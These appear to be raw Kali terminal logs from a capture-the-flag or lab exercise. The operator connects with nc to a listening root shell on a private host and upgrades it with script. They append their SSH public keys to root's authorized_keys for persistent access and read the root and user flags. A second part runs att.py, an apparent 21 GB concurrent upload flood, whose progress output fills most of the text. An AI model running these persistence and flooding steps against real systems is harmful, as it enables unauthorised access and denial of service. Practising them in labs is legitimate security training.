```bash

┌──(root㉿kali)-[~]
└─# ls
authorized_keys  authorized_keys.pub  id_rsa  id_rsa.pub

┌──(root㉿kali)-[~]
└─# ssh-keygen -t
option requires an argument -- t
usage: ssh-keygen [-q] [-a rounds] [-b bits] [-C comment] [-f output_keyfile]
                  [-m format] [-N new_passphrase] [-O option]
                  [-t dsa | ecdsa | ecdsa-sk | ed25519 | ed25519-sk | rsa]
                  [-w provider] [-Z cipher]
       ssh-keygen -p [-a rounds] [-f keyfile] [-m format] [-N new_passphrase]
                   [-P old_passphrase] [-Z cipher]
       ssh-keygen -i [-f input_keyfile] [-m key_format]
       ssh-keygen -e [-f input_keyfile] [-m key_format]
       ssh-keygen -y [-f input_keyfile]
       ssh-keygen -c [-a rounds] [-C comment] [-f keyfile] [-P passphrase]
       ssh-keygen -l [-v] [-E fingerprint_hash] [-f input_keyfile]
       ssh-keygen -B [-f input_keyfile]
       ssh-keygen -D pkcs11
       ssh-keygen -F hostname [-lv] [-f known_hosts_file]
       ssh-keygen -H [-f known_hosts_file]
       ssh-keygen -K [-a rounds] [-w provider]
       ssh-keygen -R hostname [-f known_hosts_file]
       ssh-keygen -r hostname [-g] [-f input_keyfile]
       ssh-keygen -M generate [-O option] output_file
       ssh-keygen -M screen [-f input_file] [-O option] output_file
       ssh-keygen -I certificate_identity -s ca_key [-hU] [-D pkcs11_provider]
                  [-n principals] [-O option] [-V validity_interval]
                  [-z serial_number] file ...
       ssh-keygen -L [-f input_keyfile]
       ssh-keygen -A [-a rounds] [-f prefix_path]
       ssh-keygen -k -f krl_file [-u] [-s ca_public] [-z version_number]
                  file ...
       ssh-keygen -Q [-l] -f krl_file [file ...]
       ssh-keygen -Y find-principals -s signature_file -f allowed_signers_file
       ssh-keygen -Y match-principals -I signer_identity -f allowed_signers_file
       ssh-keygen -Y check-novalidate -n namespace -s signature_file
       ssh-keygen -Y sign -f key_file -n namespace file [-O option] ...
       ssh-keygen -Y verify -f allowed_signers_file -I signer_identity
                  -n namespace -s signature_file [-r krl_file] [-O option]

┌──(root㉿kali)-[~]
└─# ssh-keygen -t ed25519
Generating public/private ed25519 key pair.
Enter file in which to save the key (/root/.ssh/id_ed25519):
Enter passphrase for "/root/.ssh/id_ed25519" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_ed25519
Your public key has been saved in /root/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:3RKltQYdkpIbQC3Y67LNtn1opu8GZ/Xqnfh7nJ8Vknc root@kali
The key's randomart image is:
+--[ED25519 256]--+
|     +oo .oo+.   |
|    . o = .*..   |
|       o +o o    |
|      . ...+  .  |
|     .  S.o..o oE|
|    . o o  .. o o|
|     = + . . . ..|
|    . +.= oo .+ o|
|     .oO+oo.=o o.|
+----[SHA256]-----+

┌──(root㉿kali)-[~]
└─# ls -la
total 124
drwx------  9 root root  4096 Dec 31 00:45 .
drwxr-xr-x 19 root root  4096 May 15  2025 ..
-rw-------  1 root root   399 Dec 20 07:58 authorized_keys
-rw-r--r--  1 root root    91 Dec 20 07:58 authorized_keys.pub
-rw-------  1 root root    22 Jul 23 16:37 .bash_history
-rw-r--r--  1 root root  5551 May 15  2025 .bashrc
-rw-r--r--  1 root root   607 May 15  2025 .bashrc.original
drwx------  6 root root  4096 Dec 20 07:57 .cache
drwx------  5 root root  4096 Jul 16 09:48 .config
drwx------  3 root root  4096 Jul 12 13:36 .dbus
drwx------  3 root root  4096 Nov 13 20:14 .docker
-rw-r--r--  1 root root 11656 May 15  2025 .face
lrwxrwxrwx  1 root root    11 May 15  2025 .face.icon -> /root/.face
drwx------  2 root root  4096 Jul 12 13:36 .gvfs
-rw-------  1 root root  2590 Dec 20 08:18 id_rsa
-rw-r--r--  1 root root   563 Dec 20 08:18 id_rsa.pub
-rw-------  1 root root    33 Jul 16 12:07 .lesshst
drwx------  3 root root  4096 Jul 12 13:36 .local
-rw-------  1 root root   346 Aug  4 08:32 .mariadb_history
-rw-r--r--  1 root root   132 Feb 17  2025 .profile
drwx------  2 root root  4096 Dec 31 00:46 .ssh
-rw-r-----  1 root root     4 Dec 31 00:45 .vboxclient-display-svga-x11-tty1-control.pid
-rw-r-----  1 root root     4 Jul 30 05:34 .vboxclient-display-svga-x11-tty2-control.pid
-rw-------  1 root root  7659 Dec 28 13:42 .viminfo
-rw-------  1 root root  1318 Dec 28 16:13 .zsh_history
-rw-r--r--  1 root root 10868 May 15  2025 .zshrc

┌──(root㉿kali)-[~]
└─# cd .ssh

┌──(root㉿kali)-[~/.ssh]
└─# ls -la
total 28
drwx------ 2 root root 4096 Dec 31 00:46 .
drwx------ 9 root root 4096 Dec 31 00:45 ..
-rw------- 1 root root  399 Dec 31 00:46 id_ed25519
-rw-r--r-- 1 root root   91 Dec 31 00:46 id_ed25519.pub
-rw------- 1 root root 3369 Dec 28 15:47 id_rsa
-rw-r--r-- 1 root root  735 Dec 28 15:47 id_rsa.pub
-rw-r--r-- 1 root root  284 Dec 28 15:54 known_hosts

┌──(root㉿kali)-[~/.ssh]
└─# cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDdTXqbLDA1SaHFoMYdA4WiHr5wydaaK+cKb2JbJTxb root@kali

┌──(root㉿kali)-[~/.ssh]
└─# nc 192.168.100.13 4567
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/root
cd .ssh
pwd
/root/.ssh
ls
echo `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDdTXqbLDA1SaHFoMYdA4WiHr5wydaaK+cKb2JbJTxb root@kali` > ~/.ssh/authorized_keys
/usr/bin/script -qc /bin/bash /dev/null
root@104567:~/.ssh# ls -la
ls -la
total 12
drw------- 2 root root 4096 Dec 30 13:36 .
drwx------ 5 root root 4096 Aug 27 01:36 ..
-rw-r--r-- 1 root root    1 Dec 30 13:36 authorized_keys
root@104567:~/.ssh# cat root.txt
cat root.txt
cat: root.txt: No such file or directory
root@104567:~/.ssh# ls -la
ls -la
total 12
drw------- 2 root root 4096 Dec 30 13:36 .
drwx------ 5 root root 4096 Aug 27 01:36 ..
-rw-r--r-- 1 root root    1 Dec 30 13:36 authorized_keys
root@104567:~/.ssh# cat /root/root.txt
cat /root/root.txt
flag{root-f526a6c9f285aa9d001a459b42ef3035}
root@104567:~/.ssh# cat /home/ll/user.txt
cat /home/ll/user.txt
flag{user-bc3c292e432690a9a0444bb46a559061}
root@104567:~/.ssh# cd
cd
root@104567:~# ls -la
ls -la
total 32
drwx------  5 root root 4096 Aug 27 01:36 .
drwxr-xr-x 18 root root 4096 Aug 22 07:17 ..
lrwxrwxrwx  1 root root    9 Aug 27 01:36 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
drwx------  3 root root 4096 Apr  4  2025 .gnupg
drwxr-xr-x  3 root root 4096 Mar 18  2025 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   44 Aug 22 08:22 root.txt
drw-------  2 root root 4096 Dec 30 13:36 .ssh
root@104567:~# cd .ssh
cd .ssh
root@104567:~/.ssh# ls -la
ls -la
total 12
drw------- 2 root root 4096 Dec 30 13:36 .
drwx------ 5 root root 4096 Aug 27 01:36 ..
-rw-r--r-- 1 root root    1 Dec 30 13:36 authorized_keys
root@104567:~/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDd7+ylTjo41EhCYlg5Cqt10b5q+wd6KNXV7B81DT6XCdxMVu6lCsJhcDOf8EbnWt0FegwZOyXanXpG3VtOzkAj2LFY2fDbjKuOg99ngz2qAZgbRWTpB+2NEqYqfbtXq9aplyU0W5nDMmMf1cW9KQI8aLRfPBOd1CsZTTan8GSw7qYb3l+28GLywef60Tokc91iugi2kLI2alycuvs1MAZulrrs/N/uuTAAUn1VVGZfc6cLHvIcddlU0YX9qbR/Kpqnfuojg9CrTBidKPhMnaO+L5HyAzllE1n4TQ5Xpq6/8bpeJMIAxbUxi1yII5L5SUwGi06Qk6rmJCEEuKm53SG1v3Gjs34xfiONwX6Tdhb/xkM9DQZ5FrFWZd8xkwEtSLC+hcuhX/ozaiLYS1HQl1PMoOHMk6HleTQuzvyXvzmffZh/geGoXV3Un6eVnxIkja2bprmNFREiohqMAyxhQhToZJ4YfbjeZF5PbrA9MoP220aCBAITqfTq+q9HTKcsC0+PSCsqPwhW+pWEI3ilPt6f5cM3AT45vUb4HHG+gdQXJVFGrarAnAQIK5TfG3snMTTZZYj3ZYX/bckZr8lXlm9+EdF4gMK0cHrPPFHPM4qIFd0UXYcwjN2x3+6uP/j1aOyFXN4r5Df9EDi0ChwzhX3LPdphuvgo2PYpcr2ho9nZ0w== root@kali' >> authorized_keys
<huvgo2PYpcr2ho9nZ0w== root@kali' >> authorized_keys
root@104567:~/.ssh# ^C

┌──(root㉿kali)-[~/.ssh]
└─# nc 192.168.100.13 4567
(UNKNOWN) [192.168.100.13] 4567 (?) : Connection refused

┌──(root㉿kali)-[~/.ssh]
└─# client_loop: send disconnect: Connection reset
```







---





```bash

┌──(root㉿kali)-[~]
└─# vim att.py

┌──(root㉿kali)-[~]
└─# python3 att.py
Traceback (most recent call last):
  File "/root/att.py", line 70, in <module>
    asyncio.run(stress_test(total_gb=21, chunk_size_mb=1, concurrent_uploads=50))
    ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/base_events.py", line 719, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/root/att.py", line 21, in stress_test
    with open("1MB.bin", "rb") as f:
         ~~~~^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '1MB.bin'

┌──(root㉿kali)-[~]
└─# ┌──(root㉿kali)-[~]
└─# python3 att.py
Traceback (most recent call last):
  File "/root/att.py", line 70, in <module>
    asyncio.run(stress_test(total_gb=21, chunk_size_mb=1, concurrent_uploads=50))
    ~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/base_events.py", line 719, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/root/att.py", line 21, in stress_test
    with open("1MB.bin", "rb") as f:
         ~~~~^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '1MB.bin'

┌──(root㉿kali)-[~]
└─# dd if=/dev/urandom of=1MB.bin bs=1M count=1
1+0 records in
1+0 records out
1048576 bytes (1.0 MB, 1.0 MiB) copied, 0.00518914 s, 202 MB/s

┌──(root㉿kali)-[~]
└─# python3 att.py
Progress: 50/21504 chunks (0.02 GB/s)
Progress: 100/21504 chunks (0.02 GB/s)
Progress: 150/21504 chunks (0.02 GB/s)
Progress: 200/21504 chunks (0.01 GB/s)
Progress: 250/21504 chunks (0.01 GB/s)
Progress: 300/21504 chunks (0.01 GB/s)
Progress: 350/21504 chunks (0.01 GB/s)
Progress: 400/21504 chunks (0.01 GB/s)
Progress: 450/21504 chunks (0.01 GB/s)
Progress: 500/21504 chunks (0.01 GB/s)
Progress: 550/21504 chunks (0.02 GB/s)
Progress: 600/21504 chunks (0.02 GB/s)
Progress: 650/21504 chunks (0.02 GB/s)
Progress: 700/21504 chunks (0.02 GB/s)
Progress: 750/21504 chunks (0.01 GB/s)
Progress: 800/21504 chunks (0.01 GB/s)
Progress: 850/21504 chunks (0.01 GB/s)
Progress: 900/21504 chunks (0.01 GB/s)
Progress: 950/21504 chunks (0.01 GB/s)
Progress: 1000/21504 chunks (0.01 GB/s)
Progress: 1050/21504 chunks (0.01 GB/s)
Progress: 1100/21504 chunks (0.01 GB/s)
Progress: 1150/21504 chunks (0.01 GB/s)
Progress: 1200/21504 chunks (0.01 GB/s)
Progress: 1250/21504 chunks (0.01 GB/s)
Progress: 1300/21504 chunks (0.01 GB/s)
Progress: 1350/21504 chunks (0.01 GB/s)
Progress: 1400/21504 chunks (0.01 GB/s)
Progress: 1450/21504 chunks (0.01 GB/s)
Progress: 1500/21504 chunks (0.01 GB/s)
Progress: 1550/21504 chunks (0.01 GB/s)
Progress: 1600/21504 chunks (0.01 GB/s)
Progress: 1650/21504 chunks (0.01 GB/s)
Progress: 1700/21504 chunks (0.01 GB/s)
Progress: 1750/21504 chunks (0.01 GB/s)
Progress: 1800/21504 chunks (0.01 GB/s)
Progress: 1850/21504 chunks (0.01 GB/s)
Progress: 1900/21504 chunks (0.02 GB/s)
Progress: 1950/21504 chunks (0.02 GB/s)
Progress: 2000/21504 chunks (0.02 GB/s)
Progress: 2050/21504 chunks (0.02 GB/s)
Progress: 2100/21504 chunks (0.02 GB/s)
Progress: 2150/21504 chunks (0.02 GB/s)
Progress: 2200/21504 chunks (0.01 GB/s)
Progress: 2250/21504 chunks (0.01 GB/s)
Progress: 2300/21504 chunks (0.01 GB/s)
Progress: 2350/21504 chunks (0.01 GB/s)
Progress: 2400/21504 chunks (0.01 GB/s)
Progress: 2450/21504 chunks (0.01 GB/s)
Progress: 2500/21504 chunks (0.01 GB/s)
Progress: 2550/21504 chunks (0.01 GB/s)
Progress: 2600/21504 chunks (0.01 GB/s)
Progress: 2650/21504 chunks (0.01 GB/s)
Progress: 2700/21504 chunks (0.01 GB/s)
Progress: 2750/21504 chunks (0.01 GB/s)
Progress: 2800/21504 chunks (0.01 GB/s)
Progress: 2850/21504 chunks (0.01 GB/s)
Progress: 2900/21504 chunks (0.01 GB/s)
Progress: 2950/21504 chunks (0.01 GB/s)
Progress: 3000/21504 chunks (0.01 GB/s)
Progress: 3050/21504 chunks (0.02 GB/s)
Progress: 3100/21504 chunks (0.02 GB/s)
Progress: 3150/21504 chunks (0.02 GB/s)
Progress: 3200/21504 chunks (0.02 GB/s)
Progress: 3250/21504 chunks (0.02 GB/s)
Progress: 3300/21504 chunks (0.02 GB/s)
Progress: 3350/21504 chunks (0.02 GB/s)
Progress: 3400/21504 chunks (0.02 GB/s)
Progress: 3450/21504 chunks (0.02 GB/s)
Progress: 3500/21504 chunks (0.02 GB/s)
Progress: 3550/21504 chunks (0.02 GB/s)
Progress: 3600/21504 chunks (0.02 GB/s)
Progress: 3650/21504 chunks (0.02 GB/s)
Progress: 3700/21504 chunks (0.02 GB/s)
Progress: 3750/21504 chunks (0.02 GB/s)
Progress: 3800/21504 chunks (0.02 GB/s)
Progress: 3850/21504 chunks (0.02 GB/s)
Progress: 3900/21504 chunks (0.02 GB/s)
Progress: 3950/21504 chunks (0.02 GB/s)
Progress: 4000/21504 chunks (0.02 GB/s)
Progress: 4050/21504 chunks (0.02 GB/s)
Progress: 4100/21504 chunks (0.02 GB/s)
Progress: 4150/21504 chunks (0.02 GB/s)
Progress: 4200/21504 chunks (0.02 GB/s)
Progress: 4250/21504 chunks (0.02 GB/s)
Progress: 4300/21504 chunks (0.02 GB/s)
Progress: 4350/21504 chunks (0.02 GB/s)
Progress: 4400/21504 chunks (0.02 GB/s)
Progress: 4450/21504 chunks (0.02 GB/s)
Progress: 4500/21504 chunks (0.02 GB/s)
Progress: 4550/21504 chunks (0.02 GB/s)
Progress: 4600/21504 chunks (0.02 GB/s)
Progress: 4650/21504 chunks (0.02 GB/s)
Progress: 4700/21504 chunks (0.02 GB/s)
Progress: 4750/21504 chunks (0.02 GB/s)
Progress: 4800/21504 chunks (0.02 GB/s)
Progress: 4850/21504 chunks (0.02 GB/s)
Progress: 4900/21504 chunks (0.02 GB/s)
Progress: 4950/21504 chunks (0.02 GB/s)
Progress: 5000/21504 chunks (0.02 GB/s)
Progress: 5050/21504 chunks (0.02 GB/s)
Progress: 5100/21504 chunks (0.02 GB/s)
Progress: 5150/21504 chunks (0.02 GB/s)
Progress: 5200/21504 chunks (0.02 GB/s)
Progress: 5250/21504 chunks (0.02 GB/s)
Progress: 5300/21504 chunks (0.02 GB/s)
Progress: 5350/21504 chunks (0.02 GB/s)
Progress: 5400/21504 chunks (0.02 GB/s)
Progress: 5450/21504 chunks (0.02 GB/s)
Progress: 5500/21504 chunks (0.02 GB/s)
Progress: 5550/21504 chunks (0.02 GB/s)
Progress: 5600/21504 chunks (0.02 GB/s)
Progress: 5650/21504 chunks (0.02 GB/s)
Progress: 5700/21504 chunks (0.02 GB/s)
Progress: 5750/21504 chunks (0.02 GB/s)
Progress: 5800/21504 chunks (0.02 GB/s)
Progress: 5850/21504 chunks (0.02 GB/s)
Progress: 5900/21504 chunks (0.02 GB/s)
Progress: 5950/21504 chunks (0.02 GB/s)
Progress: 6000/21504 chunks (0.02 GB/s)
Progress: 6050/21504 chunks (0.02 GB/s)
Progress: 6100/21504 chunks (0.02 GB/s)
Progress: 6150/21504 chunks (0.02 GB/s)
Progress: 6200/21504 chunks (0.02 GB/s)
Progress: 6250/21504 chunks (0.02 GB/s)
Progress: 6300/21504 chunks (0.02 GB/s)
Progress: 6350/21504 chunks (0.02 GB/s)
Progress: 6400/21504 chunks (0.02 GB/s)
Progress: 6450/21504 chunks (0.02 GB/s)
Progress: 6500/21504 chunks (0.02 GB/s)
Progress: 6550/21504 chunks (0.02 GB/s)
Progress: 6600/21504 chunks (0.02 GB/s)
Progress: 6650/21504 chunks (0.02 GB/s)
Progress: 6700/21504 chunks (0.02 GB/s)
Progress: 6750/21504 chunks (0.02 GB/s)
Progress: 6800/21504 chunks (0.02 GB/s)
Progress: 6850/21504 chunks (0.02 GB/s)
Progress: 6900/21504 chunks (0.02 GB/s)
Progress: 6950/21504 chunks (0.02 GB/s)
Progress: 7000/21504 chunks (0.02 GB/s)
Progress: 7050/21504 chunks (0.02 GB/s)
Progress: 7100/21504 chunks (0.02 GB/s)
Progress: 7150/21504 chunks (0.02 GB/s)
Progress: 7200/21504 chunks (0.02 GB/s)
Progress: 7250/21504 chunks (0.02 GB/s)
Progress: 7300/21504 chunks (0.02 GB/s)
Progress: 7350/21504 chunks (0.02 GB/s)
Progress: 7400/21504 chunks (0.02 GB/s)
Progress: 7450/21504 chunks (0.02 GB/s)
Progress: 7500/21504 chunks (0.02 GB/s)
Progress: 7550/21504 chunks (0.02 GB/s)
Progress: 7600/21504 chunks (0.02 GB/s)
Progress: 7650/21504 chunks (0.02 GB/s)
Progress: 7700/21504 chunks (0.02 GB/s)
Progress: 7750/21504 chunks (0.02 GB/s)
Progress: 7800/21504 chunks (0.02 GB/s)
Progress: 7850/21504 chunks (0.02 GB/s)
Progress: 7900/21504 chunks (0.02 GB/s)
Progress: 7950/21504 chunks (0.02 GB/s)
Progress: 8000/21504 chunks (0.02 GB/s)
Progress: 8050/21504 chunks (0.02 GB/s)
Progress: 8100/21504 chunks (0.02 GB/s)
Progress: 8150/21504 chunks (0.02 GB/s)
Progress: 8200/21504 chunks (0.02 GB/s)
Progress: 8250/21504 chunks (0.02 GB/s)
Progress: 8300/21504 chunks (0.02 GB/s)
Progress: 8350/21504 chunks (0.02 GB/s)
Progress: 8400/21504 chunks (0.02 GB/s)
Progress: 8450/21504 chunks (0.02 GB/s)
Progress: 8500/21504 chunks (0.02 GB/s)
Progress: 8550/21504 chunks (0.02 GB/s)
Progress: 8600/21504 chunks (0.02 GB/s)
Progress: 8650/21504 chunks (0.02 GB/s)
Progress: 8700/21504 chunks (0.02 GB/s)
Progress: 8750/21504 chunks (0.02 GB/s)
Progress: 8800/21504 chunks (0.02 GB/s)
Progress: 8850/21504 chunks (0.02 GB/s)
Progress: 8900/21504 chunks (0.02 GB/s)
Progress: 8950/21504 chunks (0.02 GB/s)
Progress: 9000/21504 chunks (0.02 GB/s)
Progress: 9050/21504 chunks (0.02 GB/s)
Progress: 9100/21504 chunks (0.02 GB/s)
Progress: 9150/21504 chunks (0.02 GB/s)
Progress: 9200/21504 chunks (0.02 GB/s)
Progress: 9250/21504 chunks (0.02 GB/s)
Progress: 9300/21504 chunks (0.02 GB/s)
Progress: 9350/21504 chunks (0.02 GB/s)
Progress: 9400/21504 chunks (0.02 GB/s)
Progress: 9450/21504 chunks (0.02 GB/s)
Progress: 9500/21504 chunks (0.02 GB/s)
Progress: 9550/21504 chunks (0.02 GB/s)
Progress: 9600/21504 chunks (0.02 GB/s)
Progress: 9650/21504 chunks (0.02 GB/s)
Progress: 9700/21504 chunks (0.02 GB/s)
Progress: 9750/21504 chunks (0.02 GB/s)
Progress: 9800/21504 chunks (0.02 GB/s)
Progress: 9850/21504 chunks (0.02 GB/s)
Progress: 9900/21504 chunks (0.02 GB/s)
Progress: 9950/21504 chunks (0.02 GB/s)
Progress: 10000/21504 chunks (0.02 GB/s)
Progress: 10050/21504 chunks (0.02 GB/s)
Progress: 10100/21504 chunks (0.02 GB/s)
Progress: 10150/21504 chunks (0.02 GB/s)
Progress: 10200/21504 chunks (0.02 GB/s)
Progress: 10250/21504 chunks (0.02 GB/s)
Progress: 10300/21504 chunks (0.02 GB/s)
Progress: 10350/21504 chunks (0.02 GB/s)
Progress: 10400/21504 chunks (0.02 GB/s)
Progress: 10450/21504 chunks (0.02 GB/s)
Progress: 10500/21504 chunks (0.02 GB/s)
Progress: 10550/21504 chunks (0.02 GB/s)
Progress: 10600/21504 chunks (0.02 GB/s)
Progress: 10650/21504 chunks (0.02 GB/s)
Progress: 10700/21504 chunks (0.02 GB/s)
Progress: 10750/21504 chunks (0.02 GB/s)
Progress: 10800/21504 chunks (0.02 GB/s)
Progress: 10850/21504 chunks (0.02 GB/s)
Progress: 10900/21504 chunks (0.02 GB/s)
Progress: 10950/21504 chunks (0.02 GB/s)
Progress: 11000/21504 chunks (0.02 GB/s)
Progress: 11050/21504 chunks (0.02 GB/s)
Progress: 11100/21504 chunks (0.02 GB/s)
Progress: 11150/21504 chunks (0.02 GB/s)
Progress: 11200/21504 chunks (0.02 GB/s)
Progress: 11250/21504 chunks (0.02 GB/s)
Progress: 11300/21504 chunks (0.02 GB/s)
Progress: 11350/21504 chunks (0.02 GB/s)
Progress: 11400/21504 chunks (0.02 GB/s)
Progress: 11450/21504 chunks (0.02 GB/s)
Progress: 11500/21504 chunks (0.02 GB/s)
Progress: 11550/21504 chunks (0.02 GB/s)
Progress: 11600/21504 chunks (0.02 GB/s)
Progress: 11650/21504 chunks (0.02 GB/s)
Progress: 11700/21504 chunks (0.02 GB/s)
Progress: 11750/21504 chunks (0.02 GB/s)
Progress: 11800/21504 chunks (0.02 GB/s)
Progress: 11850/21504 chunks (0.02 GB/s)
Progress: 11900/21504 chunks (0.02 GB/s)
Progress: 11950/21504 chunks (0.02 GB/s)
Progress: 12000/21504 chunks (0.02 GB/s)
Progress: 12050/21504 chunks (0.02 GB/s)
Progress: 12100/21504 chunks (0.02 GB/s)
Progress: 12150/21504 chunks (0.02 GB/s)
Progress: 12200/21504 chunks (0.02 GB/s)
Progress: 12250/21504 chunks (0.02 GB/s)
Progress: 12300/21504 chunks (0.02 GB/s)
Progress: 12350/21504 chunks (0.02 GB/s)
Progress: 12400/21504 chunks (0.02 GB/s)
Progress: 12450/21504 chunks (0.02 GB/s)
Progress: 12500/21504 chunks (0.02 GB/s)
Progress: 12550/21504 chunks (0.02 GB/s)
Progress: 12600/21504 chunks (0.02 GB/s)
Progress: 12650/21504 chunks (0.02 GB/s)
Progress: 12700/21504 chunks (0.02 GB/s)
Progress: 12750/21504 chunks (0.02 GB/s)
Progress: 12800/21504 chunks (0.02 GB/s)
Progress: 12850/21504 chunks (0.02 GB/s)
Progress: 12900/21504 chunks (0.02 GB/s)
Progress: 12950/21504 chunks (0.02 GB/s)
Progress: 13000/21504 chunks (0.02 GB/s)
Progress: 13050/21504 chunks (0.02 GB/s)
Progress: 13100/21504 chunks (0.02 GB/s)
Progress: 13150/21504 chunks (0.02 GB/s)
Progress: 13200/21504 chunks (0.02 GB/s)
Progress: 13250/21504 chunks (0.02 GB/s)
Progress: 13300/21504 chunks (0.02 GB/s)
Progress: 13350/21504 chunks (0.02 GB/s)
Progress: 13400/21504 chunks (0.02 GB/s)
Progress: 13450/21504 chunks (0.02 GB/s)
Progress: 13500/21504 chunks (0.02 GB/s)
Progress: 13550/21504 chunks (0.02 GB/s)
Progress: 13600/21504 chunks (0.02 GB/s)
Progress: 13650/21504 chunks (0.02 GB/s)
Progress: 13700/21504 chunks (0.02 GB/s)
Progress: 13750/21504 chunks (0.02 GB/s)
Progress: 13800/21504 chunks (0.02 GB/s)
Progress: 13850/21504 chunks (0.02 GB/s)
Progress: 13900/21504 chunks (0.02 GB/s)
Progress: 13950/21504 chunks (0.02 GB/s)
Progress: 14000/21504 chunks (0.02 GB/s)
Progress: 14050/21504 chunks (0.02 GB/s)
Progress: 14100/21504 chunks (0.02 GB/s)
Progress: 14150/21504 chunks (0.02 GB/s)
Progress: 14200/21504 chunks (0.02 GB/s)
Progress: 14250/21504 chunks (0.02 GB/s)
Progress: 14300/21504 chunks (0.02 GB/s)
Progress: 14350/21504 chunks (0.02 GB/s)
Progress: 14400/21504 chunks (0.02 GB/s)
Progress: 14450/21504 chunks (0.02 GB/s)
Progress: 14500/21504 chunks (0.02 GB/s)
Progress: 14550/21504 chunks (0.02 GB/s)
Progress: 14600/21504 chunks (0.02 GB/s)
Progress: 14650/21504 chunks (0.02 GB/s)
Progress: 14700/21504 chunks (0.02 GB/s)
Progress: 14750/21504 chunks (0.02 GB/s)
Progress: 14800/21504 chunks (0.02 GB/s)
Progress: 14850/21504 chunks (0.02 GB/s)
Progress: 14900/21504 chunks (0.02 GB/s)
Progress: 14950/21504 chunks (0.02 GB/s)
Progress: 15000/21504 chunks (0.02 GB/s)
Progress: 15050/21504 chunks (0.02 GB/s)
Progress: 15100/21504 chunks (0.02 GB/s)
Progress: 15150/21504 chunks (0.02 GB/s)
Progress: 15200/21504 chunks (0.02 GB/s)
Progress: 15250/21504 chunks (0.02 GB/s)
Progress: 15300/21504 chunks (0.02 GB/s)
Progress: 15350/21504 chunks (0.02 GB/s)
Progress: 15400/21504 chunks (0.02 GB/s)
Progress: 15450/21504 chunks (0.02 GB/s)
Progress: 15500/21504 chunks (0.02 GB/s)
Progress: 15550/21504 chunks (0.02 GB/s)
Progress: 15600/21504 chunks (0.02 GB/s)
Progress: 15650/21504 chunks (0.02 GB/s)
Progress: 15700/21504 chunks (0.02 GB/s)
Progress: 15750/21504 chunks (0.02 GB/s)
Progress: 15800/21504 chunks (0.02 GB/s)
Progress: 15850/21504 chunks (0.02 GB/s)
Progress: 15900/21504 chunks (0.02 GB/s)
Progress: 15950/21504 chunks (0.02 GB/s)
Progress: 16000/21504 chunks (0.02 GB/s)
Progress: 16050/21504 chunks (0.02 GB/s)
Progress: 16100/21504 chunks (0.02 GB/s)
Progress: 16150/21504 chunks (0.02 GB/s)
Progress: 16200/21504 chunks (0.02 GB/s)
Progress: 16250/21504 chunks (0.02 GB/s)
Progress: 16300/21504 chunks (0.02 GB/s)
Progress: 16350/21504 chunks (0.02 GB/s)
Progress: 16400/21504 chunks (0.02 GB/s)
Progress: 16450/21504 chunks (0.02 GB/s)
Progress: 16500/21504 chunks (0.02 GB/s)
Progress: 16550/21504 chunks (0.02 GB/s)
Progress: 16600/21504 chunks (0.02 GB/s)
Progress: 16650/21504 chunks (0.02 GB/s)
Progress: 16700/21504 chunks (0.02 GB/s)
Progress: 16750/21504 chunks (0.02 GB/s)
Progress: 16800/21504 chunks (0.02 GB/s)
Progress: 16850/21504 chunks (0.02 GB/s)
Progress: 16900/21504 chunks (0.02 GB/s)
Progress: 16950/21504 chunks (0.02 GB/s)
Progress: 17000/21504 chunks (0.02 GB/s)
Progress: 17050/21504 chunks (0.02 GB/s)
Progress: 17100/21504 chunks (0.02 GB/s)
Progress: 17150/21504 chunks (0.02 GB/s)
Progress: 17200/21504 chunks (0.02 GB/s)
Progress: 17250/21504 chunks (0.02 GB/s)
Progress: 17300/21504 chunks (0.02 GB/s)
Progress: 17350/21504 chunks (0.02 GB/s)
Progress: 17400/21504 chunks (0.02 GB/s)
Progress: 17450/21504 chunks (0.02 GB/s)
Progress: 17500/21504 chunks (0.02 GB/s)
Progress: 17550/21504 chunks (0.02 GB/s)
Progress: 17600/21504 chunks (0.02 GB/s)
Progress: 17650/21504 chunks (0.02 GB/s)
Progress: 17700/21504 chunks (0.02 GB/s)
Progress: 17750/21504 chunks (0.02 GB/s)
Progress: 17800/21504 chunks (0.02 GB/s)
Progress: 17850/21504 chunks (0.02 GB/s)
Progress: 17900/21504 chunks (0.02 GB/s)
Progress: 17950/21504 chunks (0.02 GB/s)
Progress: 18000/21504 chunks (0.02 GB/s)
Progress: 18050/21504 chunks (0.02 GB/s)
Progress: 18100/21504 chunks (0.02 GB/s)
Progress: 18150/21504 chunks (0.02 GB/s)
Progress: 18200/21504 chunks (0.02 GB/s)
Progress: 18250/21504 chunks (0.02 GB/s)
Progress: 18300/21504 chunks (0.02 GB/s)
Progress: 18350/21504 chunks (0.02 GB/s)
Progress: 18400/21504 chunks (0.02 GB/s)
Progress: 18450/21504 chunks (0.02 GB/s)
Progress: 18500/21504 chunks (0.02 GB/s)
Progress: 18550/21504 chunks (0.02 GB/s)
